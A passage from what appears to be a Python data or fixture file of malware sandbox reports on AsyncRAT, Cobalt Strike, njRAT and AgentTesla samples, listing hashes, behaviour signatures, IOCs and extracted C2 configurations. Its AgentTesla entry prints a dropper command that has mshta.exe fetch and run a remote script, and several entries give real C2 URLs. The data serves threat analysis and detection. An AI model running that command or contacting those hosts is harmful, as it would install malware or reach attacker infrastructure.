                            "yara_rule": "asyncrat",
                        },
                        {
                            "resource": "behavioral3/memory/3444-130-0x000000000040CB9E-mapping.dmp",
                            "yara_rule": "asyncrat",
                        },
                        {
                            "resource": "behavioral3/memory/1060-136-0x000000000040CB9E-mapping.dmp",
                            "yara_rule": "asyncrat",
                        },
                        {
                            "resource": "behavioral3/memory/824-148-0x0000000005A40000-0x0000000005A47000-memory.dmp",
                            "yara_rule": "asyncrat",
                        },
                        {
                            "resource": "behavioral3/memory/824-152-0x0000000006C50000-0x0000000006C59000-memory.dmp",
                            "yara_rule": "asyncrat",
                        },
                    ],
                    "name": "Async RAT payload",
                    "score": 9,
                    "tags": ["rat"],
                },
                {"name": "Loads dropped DLL", "score": 7},
                {"name": "Suspicious use of SetThreadContext", "score": 5},
                {
                    "desc": "Attempts to interact with connected storage/optical drive(s). Likely ransomware behaviou",
                    "label": "file_antivm_ide_drive",
                    "name": "Enumerates physical storage devices",
                    "score": 3,
                    "ttp": ["T1082"],
                },
                {"label": "reg_software_classes", "name": "Modifies registry class"},
                {
                    "label": "modifies_certificate_store_registry",
                    "name": "Modifies system certificate store",
                    "tags": ["evasion", "spyware", "trojan"],
                    "ttp": ["T1130", "T1112"],
                },
                {"name": "Suspicious behavior: EnumeratesProcesses"},
                {"name": "Suspicious use of AdjustPrivilegeToken"},
                {"name": "Suspicious use of WriteProcessMemory"},
            ],
            "size": 415172,
            "tags": ["family:asyncrat", "botnet:khalelmybrother", "persistence", "rat"],
            "target": "invoice_payment.vbs",
            "tasks": ["behavioral3"],
        },
        {
            "md5": "6646631ce4ad7128762352da81f3b030",
            "pick": "unpack001/�",
            "score": 1,
            "sha1": "1095bd4b63360fc2968d75622aa745e5523428ab",
            "sha256": "56b2d516376328129132b815e22379ae8e7176825f059c9374a33cc844482e64",
            "sha512": "1c00ed5d8568f6ebd119524b61573cfe71ca828bd8fbdd150158ec8b5db65fa0"
            "66908d120d201fce6222707bcb78e0c1151b82fdc1dccf3ada867cb810feb6da",
            "signatures": [],
            "size": 166216,
            "target": "�",
            "tasks": ["behavioral4"],
        },
        {
            "md5": "11c18dbf352d81c9532a8ef442151cb1",
            "pick": "unpack001/�",
            "sha1": "fc168555a207eb44b7960e6de96a71d420641d75",
            "sha256": "3c821036b13fff08e2430da457384b131bd56f3539101035d11c0dfa2549807d",
            "sha512": "d802d7953bfa867e7d810e2cf5abac194d0149b714be1b2b90316e28472e1422"
            "316ed116087ceed26ed3ac0377a53d600a4d909a43d68b8bd7d1db8fb9b428fa",
            "signatures": [],
            "size": 164352,
            "target": "�",
            "tasks": "null",
        },
    ],
    "tasks": {
        "211118-a13draede7-behavioral1": {
            "backend": "fu1m1",
            "failure": "static1/unpack001/�: Picked file does not exist",
            "kind": "behavioral",
            "name": "behavioral1",
            "pick": "static1/unpack001/�",
            "platform": "windows10_x64",
            "queue_id": 172796,
            "resource": "win10-en-20211104",
            "score": 1,
            "status": "failed",
            "target": "�.exe",
        },
        "211118-a13draede7-behavioral2": {
            "backend": "horse2",
            "failure": "static1/unpack001/�: Picked file does not exist",
            "kind": "behavioral",
            "name": "behavioral2",
            "pick": "static1/unpack001/�",
            "platform": "windows10_x64",
            "queue_id": 172797,
            "resource": "win10-en-20211014",
            "score": 1,
            "status": "failed",
            "target": "�.exe",
        },
        "211118-a13draede7-behavioral3": {
            "backend": "fu1m1",
            "kind": "behavioral",
            "name": "behavioral3",
            "pick": "static1/unpack001/invoice_payment.vbs",
            "platform": "windows10_x64",
            "queue_id": 172798,
            "resource": "win10-en-20211104",
            "score": 10,
            "status": "reported",
            "tags": ["family:asyncrat", "botnet:khalelmybrother", "persistence", "rat"],
            "target": "invoice_payment.vbs",
        },
        "211118-a13draede7-behavioral4": {
            "backend": "horse2",
            "failure": "platform exec: exit status 1: image=C:\\Users\\Admin\\AppData\\Local\\Temp\\'.exe\ncommand=\""
            "C:\\Users\\Admin\\AppData\\Local\\Temp\\'.exe\"\nwdir=C:\\Users\\Admin\\AppData\\Local\\Temp\nPayload er"
            "ror: The %1 application cannot be run in Win32 mode.\n",
            "kind": "behavioral",
            "name": "behavioral4",
            "pick": "static1/unpack001/'",
            "platform": "windows10_x64",
            "queue_id": 172799,
            "resource": "win10-en-20211014",
            "score": 1,
            "status": "failed",
            "target": "'.exe",
        },
        "211118-a13draede7-static1": {
            "kind": "static",
            "name": "static1",
            "status": "reported",
        },
    },
    "version": "0.2.3",
}

query_211202_qfystsbha9 = {
    "analysis": {
        "family": ["cobaltstrike"],
        "score": 10,
        "tags": [
            "family:cobaltstrike",
            "botnet:0",
            "botnet:1580103824",
            "backdoor",
            "trojan",
        ],
    },
    "extracted": [
        {
            "dropper": {
                "language": "xlm4.0",
                "source": '=CALL("shlwapi", "SHCreateThread", "JJJJ", 13424394',
                "urls": None,
            },
            "tasks": ["behavioral1"],
        },
        {
            "config": {
                "attr": {
                    "access_type": 512,
                    "host": "6a2c-91-132-175-60.ngrok.io,/ga.js",
                    "http_header1": "AAAABwAAAAAAAAADAAAABgAAAAZDb29raWUAAAAAA",
                    "http_header2": "AAAACgAAACZDb250ZW50LVR5cGU6IGFwcGxpY2F0a",
                    "http_method1": "GET",
                    "http_method2": "POST",
                    "polling_time": 60000,
                    "port_number": 80,
                    "sc_process32": "%windir%\\syswow64\\rundll32.exe",
                    "sc_process64": "%windir%\\sysnative\\rundll32.exe",
                    "state_machine": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCn",
                    "unknown1": 4096,
                    "unknown2": "AAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
                    "uri": "/submit.php",
                    "user_agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
                    "watermark": "1580103824",
                },
                "botnet": "1580103824",
                "c2": ["http://6a2c-91-132-175-60.ngrok.io:80/ga.js"],
                "family": "cobaltstrike",
                "rule": "CobaltStrike",
            },
            "dumped_file": "memory/1092-58-0x00000000047A0000-0x00000000048FC000-memory.dmp",
            "resource": "behavioral1/memory/1092-58-0x00000000047A0000-0x00000000048FC000-memory.dmp",
            "tasks": ["behavioral1"],
        },
        {
            "dropper": {
                "language": "xlm4.0",
                "source": '=CALL("shlwapi", "SHCreateThread", "JJJJ", 13424',
                "urls": None,
            },
            "tasks": ["behavioral2"],
        },
        {
            "config": {
                "attr": {"watermark": "0"},
                "botnet": "0",
                "family": "cobaltstrike",
                "rule": "CobaltStrike64",
            },
            "dumped_file": "memory/2680-264-0x0000015036A10000-0x0000015036A5E000-memory.dmp",
            "resource": "behavioral2/memory/2680-264-0x0000015036A10000-0x0000015036A5E000-memory.dmp",
            "tasks": ["behavioral2"],
        },
    ],
    "sample": {
        "completed": "2021-12-02T13:15:31Z",
        "created": "2021-12-02T13:12:51Z",
        "id": "211202-qfystsbha9",
        "md5": "e8aa8dcd4f6beb83945f93237f802aae",
        "score": 10,
        "sha1": "864d3a9a935de7eb4eaf2aeda5a72a43d5da0953",
        "sha256": "35bfaa9d4cf990dff1a67c44fb12065dc2a9d2c23b7342951ec9afd47ef70ef6",
        "sha512": "833f43baf1c917f30d1389fadf820ac73e8c8346704d3acf9887a174664311cb"
        "343f53b7c0fca9a1258d09ea2a46c6a45ea94c2"
        "33e84e98c76ef201a6245f566",
        "size": 514953,
        "target": "6065062174425088.zip",
    },
    "targets": [
        {
            "family": ["cobaltstrike"],
            "iocs": {
                "domains": [
                    "6a2c-91-132-175-60.ngrok.io",
                    "www.microsoft.com",
                    "time.windows.com",
                    "sv.symcb.com",
                ],
                "ips": [
                    "8.8.8.8",
                    "3.17.7.232",
                    "20.101.57.9",
                    "72.21.91.29",
                    "23.52.27.27",
                ],
                "urls": [
                    "http://6a2c-91-132-175-60.ngrok.io/ga.js",
                    "https://6a2c-91-132-175-60.ngrok.io/ga.js",
                    "http://sv.symcb.com/sv.crl",
                    "http://6a2c-91-132-175-60.ngrok.io/__utm.gif",
                    "https://6a2c-91-132-175-60.ngrok.io/__utm.gif",
                ],
            },
            "md5": "513cf6eccb0d244d49d75cfc3c0e8bc8",
            "pick": "unpack001/a08c334b4787086ae997c05f7077e4c6955fd5cc8a141e58d1534fe0683fc44f",
            "score": 10,
            "sha1": "947c26ca2c3ace7a8a1e013469d18c00f81ddc78",
            "sha256": "a08c334b4787086ae997c05f7077e4c6955fd5cc8a141e58d1534fe0683fc44f",
            "sha512": "274e086db431aea4fe41c94a59e56b4f62126113543afd7237cfe9793df3ba4bee393055df7a7b2e2dd18c0232e"
            "ab58956a3a6a1adf5c3f4f5cfb968ae77f92b",
            "signatures": [
                {
                    "desc": "Detected malicious payload which is part of Cobaltstrike.",
                    "label": "cobaltstrike",
                    "name": "Cobaltstrike",
                    "score": 10,
                    "tags": ["trojan", "backdoor", "family:cobaltstrike"],
                },
                {
                    "desc": "Processor information is often read in order to detect sandboxing environments.",
                    "label": "reg_hw_processor",
                    "name": "Checks processor information in registry",
                    "ttp": ["T1012", "T1082"],
                },
                {
                    "label": "reg_hw_system",
                    "name": "Enumerates system info in registry",
                    "ttp": ["T1012", "T1082"],
                },
                {
                    "label": "modifies_iexplore_settings",
                    "name": "Modifies Internet Explorer settings",
                    "tags": ["adware", "spyware"],
                    "ttp": ["T1112"],
                },
                {"label": "reg_software_classes", "name": "Modifies registry class"},
                {"name": "Suspicious behavior: AddClipboardFormatListener"},
                {"name": "Suspicious use of SetWindowsHookEx"},
            ],
            "size": 979968,
            "tags": [
                "family:cobaltstrike",
                "botnet:1580103824",
                "backdoor",
                "trojan",
                "botnet:0",
            ],
            "target": "a08c334b4787086ae997c05f7077e4c6955fd5cc8a141e58d1534fe0683fc44f",
            "tasks": ["behavioral1", "behavioral2"],
        }
    ],
    "version": "0.2.3",
}

query_211220_hdgsjaafbq = {
    "analysis": {
        "family": ["njrat"],
        "score": 10,
        "tags": ["family:njrat", "botnet:hacked", "evasion", "suricata", "trojan"],
    },
    "extracted": [
        {
            "config": {
                "attr": {
                    "reg_key": "54d823e4dec41df2d9207ed10cdce4f6",
                    "splitter": "|'|'|",
                },
                "botnet": "HacKed",
                "c2": ["OC50Y3Aubmdyb2suaW8Strik:MTQ3Mjk="],
                "family": "njrat",
                "mutex": ["54d823e4dec41df2d9207ed10cdce4f6"],
                "rule": "Njrat",
                "version": "0.7d",
            },
            "dumped_file": "sample",
            "resource": "sample",
            "tasks": ["static1", "behavioral1", "behavioral2"],
        }
    ],
    "sample": {
        "completed": "2021-12-20T06:39:39Z",
        "created": "2021-12-20T06:37:04Z",
        "id": "211220-hdgsjaafbq",
        "md5": "ab71d3024ba35c9025ead27b28c075bd",
        "score": 10,
        "sha1": "67a1c777aa8dc845de80ac5da0c26088bccbf838",
        "sha256": "707fef4235cf1842dd9090a412f0b986d5901e5a7728c89804eebdaad40c2468",
        "sha512": "cf3f96595170102d21b597d2cbb692844c960ec3ed8acdc3b37e5421cd4dc26c"
        "ab2c3e903773f2ffa03c443fec06f3d18520d4b2fd0fa3d8c8eb7ef2fe9febaf",
        "size": 95232,
        "target": "ab71d3024ba35c9025ead27b28c075bd.exe",
    },
    "signatures": [
        {"name": "Njrat family", "score": 10, "tags": ["family:njrat"]},
        {
            "desc": "Widely used RAT written in .NET.",
            "label": "njrat",
            "name": "njRAT/Bladabindi",
            "score": 10,
            "tags": ["trojan", "family:njrat"],
        },
        {
            "desc": "suricata: ET MALWARE Generic njRAT/Bladabindi CnC Activity (ll)",
            "label": "suricata_2033132",
            "name": "suricata: ET MALWARE Generic njRAT/Bladabindi CnC Activity (ll)",
            "score": 10,
            "tags": ["suricata"],
        },
        {"name": "Executes dropped EXE", "score": 8},
        {
            "label": "modifies_windows_firewall",
            "name": "Modifies Windows Firewall",
            "score": 8,
            "tags": ["evasion"],
            "ttp": ["T1031"],
        },
        {"label": "fw_startup_file", "name": "Drops startup file", "score": 7},
        {"name": "Loads dropped DLL", "score": 7},
        {
            "desc": "Attempts to interact with connected storage/optical drive(s). Likely ransomware behaviour.",
            "label": "file_antivm_ide_drive",
            "name": "Enumerates physical storage devices",
            "score": 3,
            "ttp": ["T1082"],
        },
        {"name": "Suspicious behavior: GetForegroundWindowSpam"},
        {"name": "Suspicious use of AdjustPrivilegeToken"},
        {"name": "Suspicious use of WriteProcessMemory"},
    ],
    "targets": [
        {
            "family": ["njrat"],
            "iocs": {
                "domains": ["8.tcp.ngrok.io", "time.windows.com"],
                "ips": [
                    "8.8.8.8",
                    "3.142.129.56",
                    "3.19.130.43",
                    "52.109.8.19",
                    "20.101.57.9",
                    "3.142.81.166",
                ],
            },
            "md5": "ab71d3024ba35c9025ead27b28c075bd",
            "score": 10,
            "sha1": "67a1c777aa8dc845de80ac5da0c26088bccbf838",
            "sha256": "707fef4235cf1842dd9090a412f0b986d5901e5a7728c89804eebdaad40c2468",
            "sha512": "cf3f96595170102d21b597d2cbb692844c960ec3ed8acdc3b37e5421cd4dc26c"
            "ab2c3e903773f2ffa03c443fec06f3d18520d4b2fd0fa3d8c8eb7ef2fe9febaf",
            "signatures": [
                {
                    "desc": "Widely used RAT written in .NET.",
                    "label": "njrat",
                    "name": "njRAT/Bladabindi",
                    "score": 10,
                    "tags": ["trojan", "family:njrat"],
                },
                {
                    "desc": "suricata: ET MALWARE Generic njRAT/Bladabindi CnC Activity (ll)",
                    "label": "suricata_2033132",
                    "name": "suricata: ET MALWARE Generic njRAT/Bladabindi CnC Activity (ll)",
                    "score": 10,
                    "tags": ["suricata"],
                },
                {"name": "Executes dropped EXE", "score": 8},
                {
                    "label": "modifies_windows_firewall",
                    "name": "Modifies Windows Firewall",
                    "score": 8,
                    "tags": ["evasion"],
                    "ttp": ["T1031"],
                },
                {"label": "fw_startup_file", "name": "Drops startup file", "score": 7},
                {"name": "Loads dropped DLL", "score": 7},
                {
                    "desc": "Attempts to interact with connected storage/optical drive(s).",
                    "label": "file_antivm_ide_drive",
                    "name": "Enumerates physical storage devices",
                    "score": 3,
                    "ttp": ["T1082"],
                },
                {"name": "Suspicious behavior: GetForegroundWindowSpam"},
                {"name": "Suspicious use of AdjustPrivilegeToken"},
                {"name": "Suspicious use of WriteProcessMemory"},
            ],
            "size": 95232,
            "tags": ["family:njrat", "botnet:hacked", "evasion", "suricata", "trojan"],
            "target": "ab71d3024ba35c9025ead27b28c075bd.exe",
            "tasks": ["behavioral1", "behavioral2"],
        }
    ],
    "tasks": {
        "211220-hdgsjaafbq-behavioral1": {
            "backend": "horse2",
            "kind": "behavioral",
            "name": "behavioral1",
            "platform": "windows7_x64",
            "queue_id": 3638249,
            "resource": "win7-en-20211208",
            "score": 10,
            "status": "reported",
            "tags": ["family:njrat", "botnet:hacked", "evasion", "suricata", "trojan"],
            "target": "ab71d3024ba35c9025ead27b28c075bd.exe",
        },
        "211220-hdgsjaafbq-behavioral2": {
            "backend": "fu1m1",
            "kind": "behavioral",
            "name": "behavioral2",
            "platform": "windows10_x64",
            "queue_id": 3638250,
            "resource": "win10-en-20211208",
            "score": 10,
            "status": "reported",
            "tags": ["family:njrat", "botnet:hacked", "evasion", "suricata", "trojan"],
            "target": "ab71d3024ba35c9025ead27b28c075bd.exe",
        },
        "211220-hdgsjaafbq-static1": {
            "kind": "static",
            "name": "static1",
            "score": 10,
            "status": "reported",
            "tags": ["botnet:hacked", "family:njrat"],
        },
    },
    "version": "0.2.3",
}

query_211228_jjytnscbdn = {
    "analysis": {
        "family": ["agenttesla"],
        "score": 10,
        "tags": [
            "family:agenttesla",
            "collection",
            "keylogger",
            "macro",
            "spyware",
            "stealer",
            "trojan",
        ],
    },
    "extracted": [
        {
            "dropper": {
                "language": "hta",
                "source": '"C:\\Windows\\System32\\mshta.exe" https://bitly.com/ghgfsfdsfdsfadasdqw',
                "urls": [
                    {
                        "type": "hta.dropper",
                        "url": "https://bitly.com/ghgfsfdsfdsfadasdqw",
                    }
                ],
            },
            "tasks": ["behavioral1", "behavioral2"],
        },
        {
            "config": {
                "c2": ["http://microsoftiswear.duckdns.org/y/inc/c3809dbf90d26b.php"],
                "family": "agenttesla",
                "rule": "AgentTeslaV3",
            },
            "dumped_file": "memory/4844-453-0x000000000043767E-mapping.dmp",
            "resource": "behavioral2/memory/4844-453-0x000000000043767E-mapping.dmp",
            "tasks": ["behavioral2"],
        },
    ],
    "sample": {
        "completed": "2021-12-28T07:45:19Z",
        "created": "2021-12-28T07:42:33Z",
        "id": "211228-jjytnscbdn",
        "md5": "0b2df4c0540407d1e553ec10b3bc6c9a",
        "score": 10,
        "sha1": "e85e924e58e0d305f8f4846ce332b1edb252fef8",
        "sha256": "aede7d382658c9bd7b6244ca502b020fc8301a05d253b63897a37aaabab6328a",
        "sha512": "ff54640c41840efb4816ebbfe901d1449fa257158f047da723052789559a0c20"
        "9516b915cce78066f3c4ed17d833af232063d2e542914a4e3500fdd03132c752",
        "size": 57946,
        "target": "aede7d382658c9bd7b6244ca502b020fc8301a05d253b63897a37aaabab6328a",
    },
    "signatures": [
        {
            "desc": "Agent Tesla is a remote access tool (RAT) written in visual basic.",
            "label": "agenttesla",
            "name": "AgentTesla",
            "score": 10,
            "tags": ["keylogger", "trojan", "stealer", "spyware", "family:agenttesla"],
        },
        {
            "desc": "This typically indicates the parent process was compromised via an exploit or macro.",
            "name": "Process spawned unexpected child process",
            "score": 10,
        },
        {
            "indicators": [
                {
                    "resource": "behavioral2/memory/4844-453-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4824-454-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4932-464-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4976-469-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4844-478-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4976-476-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4844-483-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4824-477-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4824-482-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4976-481-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/5048-479-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4932-480-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4932-475-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/5048-488-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/5084-499-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/5084-500-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/1488-524-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/1488-527-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4544-582-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/5048-490-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4140-619-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4468-667-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4492-668-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4192-750-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/1964-782-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4272-804-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
            ],
            "name": "AgentTesla Payload",
            "score": 9,
        },
        {"name": "Blocklisted process makes network request", "score": 8},
        {
            "label": "fw_system32_drivers",
            "name": "Drops file in Drivers directory",
            "score": 8,
        },
        {
            "desc": "Office document equipped with macros.",
            "indicators": [{"resource": "sample", "yara_rule": "office_macros"}],
            "name": "Suspicious Office macro",
            "score": 8,
            "tags": ["macro"],
        },
        {
            "label": "access_outlook_profiles",
            "name": "Accesses Microsoft Outlook profiles",
            "score": 6,
            "tags": ["collection"],
            "ttp": ["T1114"],
        },
        {"name": "Suspicious use of SetThreadContext", "score": 5},
        {
            "desc": "Attempts to interact with connected storage/optical drive(s). Likely ransomware behaviour.",
            "label": "file_antivm_ide_drive",
            "name": "Enumerates physical storage devices",
            "score": 3,
            "ttp": ["T1082"],
        },
        {"label": "program_crash", "name": "Program crash", "score": 3},
        {
            "label": "office_macro",
            "name": "Office loads VBA resources, possible macro or embedded object present",
            "score": 1,
        },
        {
            "desc": "Processor information is often read in order to detect sandboxing environments.",
            "label": "reg_hw_processor",
            "name": "Checks processor information in registry",
            "ttp": ["T1012", "T1082"],
        },
        {
            "desc": "Schtasks is often used by malware for persistence or to perform post-infection execution.",
            "label": "schtasks_persist",
            "name": "Creates scheduled task(s)",
            "tags": ["persistence"],
            "ttp": ["T1053"],
        },
        {
            "label": "reg_hw_system",
            "name": "Enumerates system info in registry",
            "ttp": ["T1012", "T1082"],
        },
        {
            "label": "modifies_iexplore_settings",
            "name": "Modifies Internet Explorer settings",
            "tags": ["adware", "spyware"],
            "ttp": ["T1112"],
        },
        {"label": "reg_software_classes", "name": "Modifies registry class"},
        {
            "label": "modifies_certificate_store_registry",
            "name": "Modifies system certificate store",
            "tags": ["evasion", "spyware", "trojan"],
            "ttp": ["T1130", "T1112"],
        },
        {"name": "Suspicious behavior: AddClipboardFormatListener"},
        {"name": "Suspicious behavior: EnumeratesProcesses"},
        {"name": "Suspicious use of AdjustPrivilegeToken"},
        {"name": "Suspicious use of SetWindowsHookEx"},
        {"name": "Suspicious use of WriteProcessMemory"},
        {"label": "outlook_office_path", "name": "outlook_office_path"},
        {"label": "outlook_win_path", "name": "outlook_win_path"},
    ],
    "targets": [
        {
            "family": ["agenttesla"],
            "iocs": {
                "domains": [
                    "bitly.com",
                    "servicemoreoverhttps.blogspot.com",
                    "www.blogger.com",
                    "accounts.google.com",
                    "resources.blogblog.com",
                    "bit.ly",
                    "time.windows.com",
                    "e0e60b79-a4cf-434f-a1f3-9fc2defea271.usrfiles.com",
                    "microsoftiswear.duckdns.org",
                ],
                "ips": [
                    "8.8.8.8",
                    "67.199.248.14",
                    "142.250.179.161",
                    "142.250.179.169",
                    "142.251.36.45",
                    "67.199.248.10",
                    "20.101.57.9",
                    "34.102.176.152",
                    "103.151.122.110",
                ],
                "urls": [
                    "https://bitly.com/ghgfsfdsfdsfadasdqw",
                    "https://servicemoreoverhttps.blogspot.com/p/moreneweronesmores.html",
                    "https://www.blogger.com/static/v1/widgets/1529571102-css_bundle_v2.css",
                    "https://www.blogger.com/static/v1/jsbin/2287435483-ieretrofit.js",
                    "https://www.blogger.com/static/v1/widgets/1434883710-widgets.js",
                    "https://www.blogger.com/dyn-css/authorization.css?targetBlogID=4084127657443813593&zx=e24bd"
                    "7a7-0192-446c-9e2c-8154e3000379",
                    "https://www.blogger.com/blogin.g?blogspotURL=https://servicemoreoverhttps.blogspot.com/p/mo"
                    "reneweronesmores.html&type=blog",
                    "https://www.blogger.com/blogin.g?blogspotURL=https%3A%2F%2Fservicemoreoverhttps.blogspot.co"
                    "m%2Fp%2Fmoreneweronesmores.html&type=blog&bpli=1",
                    "https://accounts.google.com/ServiceLogin?passive=true&continue=https://www.blogger.com/blog"
                    "in.g?blogspotURL%3Dhttps://servicemoreoverhttps.blogspot.com/p/moreneweronesmores.html%26ty"
                    "pe%3Dblog%26bpli%3D1&followup=https://www.blogger.com/blogin.g?blogspotURL%3Dhttps://servic"
                    "emoreoverhttps.blogspot.com/p/moreneweronesmores.html%26type%3Dblog%26bpli%3D1&go=true",
                    "https://resources.blogblog.com/blogblog/data/1kt/simple/body_gradient_tile_light.png",
                    "https://resources.blogblog.com/blogblog/data/1kt/simple/gradients_light.png",
                    "https://bit.ly/3EHfu3v?cc=00c33bb4c2730049983312a3da89d3cf",
                    "https://www.blogger.com/static/v1/v-css/281434096-static_pages.css",
                    "https://www.blogger.com/static/v1/jsbin/3101730221-analytics_autotrack.js",
                    "https://e0e60b79-a4cf-434f-a1f3-9fc2defea271.usrfiles.com/ugd/e0e60b_d494b095c43f489b80d2ee"
                    "6d6acdda35.txt?dn=1239",
                    "https://e0e60b79-a4cf-434f-a1f3-9fc2defea271.usrfiles.com/ugd/e0e60b_d494b095c43f489b80d2ee"
                    "6d6acdda35.txt?dn=2198",
                    "http://microsoftiswear.duckdns.org/y/inc/c3809dbf90d26b.php",
                ],
            },
            "md5": "0b2df4c0540407d1e553ec10b3bc6c9a",
            "score": 10,
            "sha1": "e85e924e58e0d305f8f4846ce332b1edb252fef8",
            "sha256": "aede7d382658c9bd7b6244ca502b020fc8301a05d253b63897a37aaabab6328a",
            "sha512": "ff54640c41840efb4816ebbfe901d1449fa257158f047da723052789559a0c20"
            "9516b915cce78066f3c4ed17d833af232063d2e542914a4e3500fdd03132c752",
            "signatures": [
                {
                    "desc": "Agent Tesla is a remote access tool (RAT) written in visual basic.",
                    "label": "agenttesla",
                    "name": "AgentTesla",
                    "score": 10,
                    "tags": [
                        "keylogger",
                        "trojan",
                        "stealer",
                        "spyware",
                        "family:agenttesla",
                    ],
                },
                {
                    "desc": "This typically indicates the parent process was compromised via an exploit or macro.",
                    "name": "Process spawned unexpected child process",
                    "score": 10,
                },
                {
                    "indicators": [],
                    "name": "AgentTesla Payload",
                    "score": 9,
                },
                {"name": "Blocklisted process makes network request", "score": 8},
                {
                    "label": "fw_system32_drivers",
                    "name": "Drops file in Drivers directory",
                    "score": 8,
                },
                {
                    "label": "access_outlook_profiles",
                    "name": "Accesses Microsoft Outlook profiles",
                    "score": 6,
                    "tags": ["collection"],
                    "ttp": ["T1114"],
                },
                {"name": "Suspicious use of SetThreadContext", "score": 5},
                {
                    "desc": "Attempts to interact with connected storage/optical drive. Likely ransomware behaviour.",
                    "label": "file_antivm_ide_drive",
                    "name": "Enumerates physical storage devices",
                    "score": 3,
                    "ttp": ["T1082"],
                },
                {"label": "program_crash", "name": "Program crash", "score": 3},
                {
                    "label": "office_macro",
                    "name": "Office loads VBA resources, possible macro or embedded object present",
                    "score": 1,
                },
                {
                    "desc": "Processor information is often read in order to detect sandboxing environments.",
                    "label": "reg_hw_processor",
                    "name": "Checks processor information in registry",
                    "ttp": ["T1012", "T1082"],
                },
                {
                    "desc": "Schtasks is often used by malware for persistence or to perform post-inf execution.",
                    "label": "schtasks_persist",
                    "name": "Creates scheduled task(s)",
                    "tags": ["persistence"],
                    "ttp": ["T1053"],
                },
                {
                    "label": "reg_hw_system",
                    "name": "Enumerates system info in registry",
                    "ttp": ["T1012", "T1082"],
                },
                {
                    "label": "modifies_iexplore_settings",
                    "name": "Modifies Internet Explorer settings",
                    "tags": ["adware", "spyware"],
                    "ttp": ["T1112"],
                },
                {"label": "reg_software_classes", "name": "Modifies registry class"},
                {
                    "label": "modifies_certificate_store_registry",
                    "name": "Modifies system certificate store",
                    "tags": ["evasion", "spyware", "trojan"],
                    "ttp": ["T1130", "T1112"],
                },
                {"name": "Suspicious behavior: AddClipboardFormatListener"},
                {"name": "Suspicious behavior: EnumeratesProcesses"},
                {"name": "Suspicious use of AdjustPrivilegeToken"},
                {"name": "Suspicious use of SetWindowsHookEx"},
                {"name": "Suspicious use of WriteProcessMemory"},
                {"label": "outlook_office_path", "name": "outlook_office_path"},
                {"label": "outlook_win_path", "name": "outlook_win_path"},
            ],
            "size": 57946,
            "tags": [
                "family:agenttesla",
                "collection",
                "keylogger",
                "spyware",
                "stealer",
                "trojan",
            ],
            "target": "aede7d382658c9bd7b6244ca502b020fc8301a05d253b63897a37aaabab6328a",
            "tasks": ["behavioral1", "behavioral2"],
        }
    ],
    "tasks": {
        "211228-jjytnscbdn-behavioral1": {
            "backend": "fu1m1",
            "kind": "behavioral",
            "name": "behavioral1",
            "platform": "windows7_x64",
            "queue_id": 3651102,
            "resource": "win7-en-20211208",
            "score": 10,
            "status": "reported",
            "target": "aede7d382658c9bd7b6244ca502b020fc8301a05d253b63897a37aaabab6328a.xlsm",
        },
        "211228-jjytnscbdn-behavioral2": {
            "backend": "horse2",
            "kind": "behavioral",
            "name": "behavioral2",
            "platform": "windows10_x64",
            "queue_id": 3651103,
            "resource": "win10-en-20211208",
            "score": 10,
            "status": "reported",
            "tags": [
                "family:agenttesla",
                "collection",
                "keylogger",
                "spyware",
                "stealer",
                "trojan",
            ],
